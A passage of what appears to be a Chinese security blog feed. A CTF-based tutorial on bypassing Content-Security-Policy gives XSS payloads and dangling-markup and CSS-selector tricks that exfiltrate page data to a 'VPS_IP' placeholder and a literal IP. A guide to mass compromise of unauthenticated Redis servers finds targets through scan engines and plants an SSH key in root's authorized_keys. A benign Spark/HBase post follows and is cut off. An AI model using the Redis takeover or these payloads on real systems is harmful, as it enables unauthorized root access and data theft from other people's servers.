class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src https://www.google.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="http://yun.name168.cn/20190511094532-76ef45c6-738e-1.png" alt="&quot;www.5658.pw&quot;"><br>配合注释符，我们即可执行任意js<br>下面是一些存在用户可控资源或者jsonp比较常用站点的github项目<br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a><br>利用条件:</p><ol><li>站点存在可控Jsonp</li><li>站点在CSP白名单中</li></ol><h3 id="Base-uri绕过"><a href="#Base-uri绕过" class="headerlink" title="Base-uri绕过"></a>Base-uri绕过</h3><p>第一次知道base-uri绕过是RCTF 2018 rBlog的非预期解&lt;<a href="https://blog.cal1.cn/post/RCTF" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF</a> 2018 rBlog writeup&gt;<br>当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径<br>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;</span><br><span class="line">&lt;base href=&quot;//vps_ip/&quot;&gt;</span><br><span class="line">&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="http://yun.name168.cn/20190511094533-76fbf190-738e-1.png" alt="&quot;www.5658.pw&quot;"><br><img src="http://yun.name168.cn/20190511094533-770d1128-738e-1.png" alt="&quot;www.5658.pw&quot;"><br>注意：如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法，因为vps_ip不在csp白名单内</p><p>利用条件:</p><ol><li>script-src只使用nonce</li><li>没有额外设置base-uri</li><li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li></ol><h3 id="不完整script标签绕过nonce"><a href="#不完整script标签绕过nonce" class="headerlink" title="不完整script标签绕过nonce"></a>不完整script标签绕过nonce</h3><p>考虑下下列场景，如果存在这样场景，该怎么绕过CSP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-xxxxx&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;]?&gt;</span><br><span class="line">&lt;script nonce=&apos;xxxxx&apos;&gt;</span><br><span class="line">  //do some thing</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果我们输入 <code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code> 即可xss<br>这是因为当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的&lt;script会变成一个属性，值为空，之后的nonce=’xxxxx’会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src<br><img src="http://yun.name168.cn/20190511094533-77196efa-738e-1.png" alt="&quot;www.5658.pw&quot;"></p><p>但是在chrome中，虽然第二个&lt;script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行<br><img src="http://yun.name168.cn/20190511094533-772405ea-738e-1.png" alt="&quot;www.5658.pw&quot;"><br>这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 3.php --&gt;</span><br><span class="line">&lt;h1 a=&quot;123&quot; b=&quot;456&quot; a=&quot;789&quot; a=&quot;abc&quot;&gt;123&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p><img src="http://yun.name168.cn/20190511094533-772ac830-738e-1.png" alt="&quot;www.5658.pw&quot;"></p><p>于是我们可以输入 <code>http://127.0.0.1/2.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</code><br>先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个&lt;script赋给了第二个a属性，浏览器在解析的时候直接忽略了第二个属性及其后面的值，这样exp就能成功在chrome浏览器上执行</p><p><img src="http://yun.name168.cn/20190511094533-7734112e-738e-1.png" alt="&quot;www.5658.pw&quot;"></p><p>利用条件:</p><ol><li>可控点在合法script标签上方,且其中没有其他标签</li><li>XSS页面的CSP script-src只采用了nonce方式</li></ol><h3 id="object-src绕过（PDFXSS）"><a href="#object-src绕过（PDFXSS）" class="headerlink" title="object-src绕过（PDFXSS）"></a>object-src绕过（PDFXSS）</h3><p>假如只有这一个页面，我们能有办法执行JS吗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;]?&gt;</span><br></pre></td></tr></table></figure><p>在CSP标准里面，有一个属性是object-src，它限制的是<embed> <object> <applet>标签的src，也就是插件的src<br>于是我们可以通过插件来执行Javascript代码，插件的js代码并不受script-src的约束<br>最常见的就是flash-xss，但是flash实在太老，而且我想在看的师傅们也很少会开浏览器的flash了，所以我这里也不说明了，这里主要讲之前一个提交asrc的pdf-xss为例<br>PDF文件中允许执行javascript脚本，但是之前浏览器的pdf解析器并不会解析pdf中的js，但是之前chrome的一次更新中突然允许加载pdf的javascript脚本</applet></object></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed width=&quot;100%&quot; height=&quot;100%&quot; src=&quot;//vps_ip/123.pdf&quot;&gt;&lt;/embed&gt;</span><br></pre></td></tr></table></figure><p><img src="http://yun.name168.cn/20190511094533-77407888-738e-1.png" alt="&quot;www.5658.pw&quot;"><br>当然pdf的xss并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等<br>具体可以看看这篇文章<a href="https://blog.csdn.net/microzone/article/details/52850623" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/52850623</a><br>里面有上面实例用的恶意pdf文件</p><p>当然，上面的例子并没有设置default-src,所以我们可以用外域的pdf文件，如果设置了default-src，我们必须找到一个pdf的上传点，（当然能上传的话直接访问这个pdf就能xss了2333），然后再用标签引用同域的pdf文件</p><p>利用条件:</p><ol><li>没有设置object-src，或者object-src没有设置为’none’</li><li>pdf用的是chrome的默认解析器</li></ol><h3 id="SVG绕过"><a href="#SVG绕过" class="headerlink" title="SVG绕过"></a>SVG绕过</h3><p>SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss</p><p>之前的easer CONFidence CTF就出过svg的xss<br>引用 <a href="https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/" target="_blank" rel="noopener">https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/</a><br>1.svg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p><img src="http://yun.name168.cn/20190511094533-774957c8-738e-1.png" alt="&quot;www.5658.pw&quot;"><br>利用条件:</p><ol><li>可以上传svg图片</li></ol><h3 id="不完整的资源标签获取资源"><a href="#不完整的资源标签获取资源" class="headerlink" title="不完整的资源标签获取资源"></a>不完整的资源标签获取资源</h3><p>看看下面的例子，我们如何把flag给带出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;self&apos;; img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;]?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class="line">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure><p>这里可以注意到img用了*,有些网站会用很多外链图片，所以这个情况并不少见<br>虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的&lt;img标签来将数据带出</p><p>exp: <code>http://127.0.0.1/2.php?xss=&lt;img src=&quot;//VPS_IP?a=</code><br>此时，由于src的引号没有闭合，html解析器会去一直寻找第二个引号，引号其中的大部分标签都不会被解析，所以在第四行的第一个引号前的所有内容，都会被当成src的值被发送到我们的vps上<br><img src="http://yun.name168.cn/20190511094533-7753e788-738e-1.png" alt="&quot;www.5658.pw&quot;"><br>需要注意的是，chrome下这个exp并不会成功，因为chrome不允许发出的url中含有回车或&lt;，否者不会发出<br><img src="http://yun.name168.cn/20190511094533-7765f3ec-738e-1.png" alt="&quot;www.5658.pw&quot;"><br>利用条件:</p><ol><li>可以加载外域资源 (img-src: *)</li><li>需要获取页面某处的信息</li><li>不好总结，看上面例子，懂意思就行</li></ol><h3 id="CSS选择器获取内容"><a href="#CSS选择器获取内容" class="headerlink" title="CSS选择器获取内容"></a>CSS选择器获取内容</h3><p>这个来自2018 SECCON CTF的一道题，虽然原题中不是用来绕csp，但是也能拿过来利用，当然利用条件比较苛刻，需要<br>设置style-src为*，或者只设置了script-src<br>原题可以看看这篇文章<a href="https://www.yourhome.ren/index.php/sec/608.html" target="_blank" rel="noopener">https://www.yourhome.ren/index.php/sec/608.html</a><br>大概思路就是css提供了选择器，当选择器到对应元素的时，可以加载一个外域请求，相当于sql的盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//这里引用的是上面文章中的exp</span><br><span class="line">input[value^=&quot;6703&quot;] &#123;background-image:url(&quot;http://vps_ip/?6703&quot;);&#125;</span><br></pre></td></tr></table></figure><p>这句话的意思是，当input的value值已6703开头，则去加载后面的url，于是我们可以一位一位爆破，先猜第一位，再猜第二位。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;self&apos;; style-src &apos;unsafe-inline&apos;;img-src *&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;]?&gt;</span><br><span class="line">&lt;input value=&quot;flag&#123;0xffff&#125;&quot;&gt;</span><br></pre></td></tr></table></figure><p>exp: <code>http://127.0.0.1/1.php?xss=&lt;style&gt;input[value^=&quot;flag{0xffff}&quot;] {background-image:url(&quot;http://47.106.65.216:1002/?flag{0xffff}&quot;)}%3C/style%3E</code><br><img src="http://yun.name168.cn/20190511094533-7753e788-738e-1.png" alt="&quot;www.5658.pw&quot;"><br>太苛刻了，之前想到随便提一下好了<br>利用条件:(好苛刻啊都不想写了)</p><ol><li>style允许内敛，img可以跨域</li><li>需要获取的数据在页面内</li><li>可以新建标签</li><li>可以多次发送xss且获取的数据不会变（毕竟不可能一次请求就注出来，除非能执行js写脚本一口气注）</li></ol><h3 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h3><p>HCTF2018的一道题，当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP<br>原题github <a href="https://github.com/Lou00/HCTF2018_Bottle" target="_blank" rel="noopener">https://github.com/Lou00/HCTF2018_Bottle</a></p><p>这个原理比较简单，就不写条件了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSP简介&quot;&gt;&lt;a href=&quot;#CSP简介&quot; class=&quot;headerlink&quot; title=&quot;CSP简介&quot;&gt;&lt;/a&gt;CSP简介&lt;/h2&gt;&lt;p&gt;内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。&lt;br&gt;当代网站太容易收到XSS的攻击，CSP就是一个统一有效的防止网站收到XSS攻击的防御方法。CSP是一种白名单策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行。&lt;br&gt;CSP的具体介绍可以看看手册&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;内容安全策略&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全技术" scheme="https://www.5658.pw/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
      <category term="WEB安全" scheme="https://www.5658.pw/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CSP" scheme="https://www.5658.pw/tags/CSP/"/>
    
      <category term="CDN" scheme="https://www.5658.pw/tags/CDN/"/>
    
      <category term="SVF" scheme="https://www.5658.pw/tags/SVF/"/>
    
      <category term="CRLF" scheme="https://www.5658.pw/tags/CRLF/"/>
    
      <category term="JSONP" scheme="https://www.5658.pw/tags/JSONP/"/>
    
  </entry>
  
  <entry>
    <title>Redis批量getshell的方法</title>
    <link href="https://www.5658.pw/2019/04/03/Redis%E6%89%B9%E9%87%8Fgetshell%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://www.5658.pw/2019/04/03/Redis批量getshell的方法/</id>
    <published>2019-04-03T03:18:56.000Z</published>
    <updated>2019-05-11T03:44:18.128Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://yun.name168.cn/e76d1528537749.jpg" alt="&quot;Redis&quot;"></p><p>快速获取一天linux服务器权限的方法之一</p><p><strong>0x1 什么是Redis</strong></p><p>​    Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p><a id="more"></a><p><strong>0x2 Redis未授权访问</strong></p><p>​      Redis因配置不当导致未授权访问，被黑客恶意利用。目前针对Redis未授权访问的攻击已成一种新型流行攻击方式，多见于获取服务器权限后进行挖矿（继比特币又火了一把之后，各种币热火朝天比如门罗币、零币等）。</p><p>​      如果Redis以root身份运行，黑客可以利用Redis写入SSH公钥文件，直接通过SSH免密码登录受害服务器。Redis 默认绑定在6379端口，并且没有开启认证，在没有任何访问策略的情况下，任何人可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p><p><strong>0x2 Redis主机批量采集</strong></p><p>​    批量获取存在Redis未授权访问的服务器方法我通常用以下方法：</p><p>1.Zoomeyes、shodan、fofa等网络空间搜索引擎</p><p>2.使用S扫描器扫描指定B、C段开放了默认端口的IP</p><p>3.使用nmap+redis script扫描IP段</p><p>​      其实不管使用哪种方法想要达到批量的目的，无外乎获取大量开放Redis服务的主机后批量进行验证。之前使用的最快的方法是使用cdxy写的POC-T开源测试框架（<a href="https://github.com/Xyntax/POC-T）。自带的有关于Redis利用插件：" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T）。自带的有关于Redis利用插件：</a></p><p><img src="http://yun.name168.cn/8ae71528539353.png" alt="&quot;Redis主机批量采集&quot;"></p><p>配置Zoomeye的登录配置文件，根据搜索参数进行获取开放Redis服务的主机：</p><p><img src="http://yun.name168.cn/58f11528539388.png" alt="&quot;Redis主机批量采集&quot;"></p><p>另外一个值得说的插件是可验证是否能够修改.ssh目录下的authorized_keys文件，代码细节：</p><p>将Zoomeye或S扫描器获取存在未授权访问的IP导入过滤即可：</p><p><img src="http://yun.name168.cn/d8f71528539764.png" alt="&quot;Redis主机批量采集&quot;"></p><p>在本地生成公钥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">将公钥写入文件并使用redis-cli导入缓存：</span><br><span class="line">echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txtcat /root/.ssh/key.txt | ./redis-cli -h 192.168.10.153 -x set xxx</span><br></pre></td></tr></table></figure><p>指定Redis服务器的备份目录及文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh config set dbfilename authorized_keys save</span><br></pre></td></tr></table></figure><p>使用ssh客户端连接：</p><p><img src="http://yun.name168.cn/0d501528540310.png" alt="&quot;Redis主机批量采集&quot;"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://yun.name168.cn/e76d1528537749.jpg&quot; alt=&quot;&amp;quot;Redis&amp;quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;快速获取一天linux服务器权限的方法之一&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0x1 什么是Redis&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​    Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。&lt;/p&gt;
    
    </summary>
    
      <category term="技术资源" scheme="https://www.5658.pw/categories/%E6%8A%80%E6%9C%AF%E8%B5%84%E6%BA%90/"/>
    
      <category term="渗透测试" scheme="https://www.5658.pw/categories/%E6%8A%80%E6%9C%AF%E8%B5%84%E6%BA%90/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Linux" scheme="https://www.5658.pw/tags/Linux/"/>
    
      <category term="Redis" scheme="https://www.5658.pw/tags/Redis/"/>
    
      <category term="GetShell" scheme="https://www.5658.pw/tags/GetShell/"/>
    
  </entry>
  
  <entry>
    <title>SHC：使用 Spark SQL 高效地读写 HBase</title>
    <link href="https://www.5658.pw/2019/04/02/SHC%EF%BC%9A%E4%BD%BF%E7%94%A8-Spark-SQL-%E9%AB%98%E6%95%88%E5%9C%B0%E8%AF%BB%E5%86%99-HBase/"/>
    <id>https://www.5658.pw/2019/04/02/SHC：使用-Spark-SQL-高效地读写-HBase/</id>
    <published>2019-04-02T03:46:56.000Z</published>
    <updated>2019-05-11T04:24:04.525Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Apache <a href="https://www.iteblog.com/archives/tag/spark/" target="_blank" rel="noopener">Spark</a> 和 Apache <a href="https://www.iteblog.com/archives/tag/hbase/" target="_blank" rel="noopener">HBase</a> 是两个使用比较广泛的大数据组件。很多场景需要使用 <a href="https://www.iteblog.com/archives/tag/spark/" target="_blank" rel="noopener">Spark</a> 分析/查询 <a href="https://www.iteblog.com/archives/tag/hbase/" target="_blank" rel="noopener">HBase</a> 中的数据，而目前 <a href="https://www.iteblog.com/archives/tag/spark/" target="_blank" rel="noopener">Spark</a> 内置是支持很多数据源的，其中就包括了 <a href="https://www.iteblog.com/archives/tag/hbase/" target="_blank" rel="noopener">HBase</a>，但是内置的读取数据源还是使用了 TableInputFormat 来读取 HBase 中的数据。这个 TableInputFormat 有一些缺点：</p><ul><li>一个 Task 里面只能启动一个 Scan 去 HBase 中读取数据；</li><li>TableInputFormat 中不支持 BulkGet；</li><li>不能享受到 Spark SQL 内置的 catalyst 引擎的优化。</li></ul><p>基于这些问题，来自 Hortonworks 的工程师们为我们带来了全新的 Apache Spark—Apache HBase Connector，下面简称 SHC。通过这个类库，我们可以直接使用 Spark SQL 将 DataFrame 中的数据写入到 HBase 中；而且我们也可以使用 Spark SQL 去查询 HBase 中的数据，在查询 HBase 的时候充分利用了 catalyst 引擎做了许多优化，比如分区修剪（partition pruning），列修剪（column pruning），谓词下推（predicate pushdown）和数据本地性（data locality）等等。因为有了这些优化，通过 Spark 查询 HBase 的速度有了很大的提升。</p><a id="more"></a><p><strong>注意：SHC 同时还提供了将 DataFrame 中的数据直接写入到 HBase 中，但是整个代码并没有什么优化的地方，所以本文对这部分不进行介绍。感兴趣的读者可以直接到这里查看相关写数据到 HBase 的代码。</strong></p><p>文章目录</p><ul><li>1 SHC 是如何实现查询优化的呢<ul><li><a href="https://www.iteblog.com/archives/2522.html#_Rowkey_get" target="_blank" rel="noopener">1.1 将使用 Rowkey 的查询转换成 get 查询</a></li></ul></li><li><a href="https://www.iteblog.com/archives/2522.html#_RowKey" target="_blank" rel="noopener">2 组合 RowKey 的查询优化</a></li><li><a href="https://www.iteblog.com/archives/2522.html#scan" target="_blank" rel="noopener">3 scan 查询优化</a></li></ul><h2 id="SHC-是如何实现查询优化的呢"><a href="#SHC-是如何实现查询优化的呢" class="headerlink" title="SHC 是如何实现查询优化的呢"></a>SHC 是如何实现查询优化的呢</h2><p>SHC 主要使用下面的几种优化，使得 Spark 获取 HBase 的数据扫描范围得到减少，提高了数据读取的效率。</p><h3 id="将使用-Rowkey-的查询转换成-get-查询"><a href="#将使用-Rowkey-的查询转换成-get-查询" class="headerlink" title="将使用 Rowkey 的查询转换成 get 查询"></a>将使用 Rowkey 的查询转换成 get 查询</h3><p>我们都知道，HBase 中使用 Get 查询的效率是非常高的，所以如果查询的过滤条件是针对 RowKey 进行的，那么我们可以将它转换成 Get 查询。为了说明这点，我们使用下面的例子进行说明。假设我们定义好的 HBase catalog 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`val` `catalog ``=` `s``&quot;&quot;``&quot;&#123;``  ``|&quot;``table``&quot;:&#123;&quot;``namespace``&quot;:&quot;``default``&quot;, &quot;``name``&quot;:&quot;``iteblog``&quot;, &quot;``tableCoder``&quot;:&quot;``PrimitiveType``&quot;&#125;,``  ``|&quot;``rowkey``&quot;:&quot;``key``&quot;,``  ``|&quot;``columns``&quot;:&#123;``    ``|&quot;``col``0``&quot;:&#123;&quot;``cf``&quot;:&quot;``rowkey``&quot;, &quot;``col``&quot;:&quot;``id``&quot;, &quot;``type``&quot;:&quot;``int``&quot;&#125;,``    ``|&quot;``col``1``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``1``&quot;, &quot;``col``&quot;:&quot;``col``1``&quot;, &quot;``type``&quot;:&quot;``boolean``&quot;&#125;,``    ``|&quot;``col``2``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``2``&quot;, &quot;``col``&quot;:&quot;``col``2``&quot;, &quot;``type``&quot;:&quot;``double``&quot;&#125;,``    ``|&quot;``col``3``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``3``&quot;, &quot;``col``&quot;:&quot;``col``3``&quot;, &quot;``type``&quot;:&quot;``float``&quot;&#125;,``    ``|&quot;``col``4``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``4``&quot;, &quot;``col``&quot;:&quot;``col``4``&quot;, &quot;``type``&quot;:&quot;``int``&quot;&#125;,``    ``|&quot;``col``5``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``5``&quot;, &quot;``col``&quot;:&quot;``col``5``&quot;, &quot;``type``&quot;:&quot;``bigint``&quot;&#125;,``    ``|&quot;``col``6``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``6``&quot;, &quot;``col``&quot;:&quot;``col``6``&quot;, &quot;``type``&quot;:&quot;``smallint``&quot;&#125;,``    ``|&quot;``col``7``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``7``&quot;, &quot;``col``&quot;:&quot;``col``7``&quot;, &quot;``type``&quot;:&quot;``string``&quot;&#125;,``    ``|&quot;``col``8``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``8``&quot;, &quot;``col``&quot;:&quot;``col``8``&quot;, &quot;``type``&quot;:&quot;``tinyint``&quot;&#125;``  ``|&#125;``|&#125;&quot;``&quot;&quot;``.stripMargin`</span><br></pre></td></tr></table></figure><p>那么如果有类似下面的查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`val` `df ``=` `withCatalog(catalog)``df.createOrReplaceTempView(``&quot;iteblog_table&quot;``)``sqlContext.sql(``&quot;select * from iteblog_table where id = 1&quot;``)``sqlContext.sql(``&quot;select * from iteblog_table where id = 1 or id = 2&quot;``)``sqlContext.sql(``&quot;select * from iteblog_table where id in (1, 2)&quot;``)`</span><br></pre></td></tr></table></figure><p>因为查询条件直接是针对 RowKey 进行的，所以这种情况直接可以转换成 Get 或者 BulkGet 请求的。第一个 SQL 查询过程类似于下面过程</p><p><img src="http://yun.name168.cn/shc_get-5658pw.png" alt="SHC：使用 Spark SQL 高效地读写 HBase"><br>如果想及时了解Spark、Hadoop或者Hbase相关的文章，欢迎关注微信公共帐号：<strong>iteblog_hadoop</strong></p><p>后面两条 SQL 查询其实是等效的，在实现上会把 <code>key in (x1, x2, x3..)</code> 转换成 <code>(key == x1) or (key == x2) or ...</code> 的。整个查询流程如下：</p><p><img src="http://yun.name168.cn/shc_bulkget-5658pw.png" alt="&quot;SHC：使用 Spark SQL 高效地读写 HBase&quot;"></p><p>如果想及时了解Spark、Hadoop或者Hbase相关的文章，欢迎关注微信公共帐号：<strong>iteblog_hadoop</strong></p><p>如果我们的查询里面有 Rowkey 还有其他列的过滤，比如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where id = 1 and col7 = &apos;xxx&apos;&quot;``)`</span><br></pre></td></tr></table></figure><p>那么上面的 SQL 翻译成 HBase 的下面查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`val` `filter ``=` `new` `SingleColumnValueFilter(``              ``Bytes.toBytes(``&quot;cf7&quot;``), Bytes.toBytes(``&quot;col7 &quot;``)``              ``CompareOp.EQUAL,``             ``Bytes.toBytes(``&quot;xxx&quot;``))` `val` `g ``=` `new` `Get(Bytes.toBytes(``1``))``g.addColumn(Bytes.toBytes(``&quot;cf6&quot;``), Bytes.toBytes(``&quot;col6&quot;``))``g.addColumn(Bytes.toBytes(``&quot;cf8&quot;``), 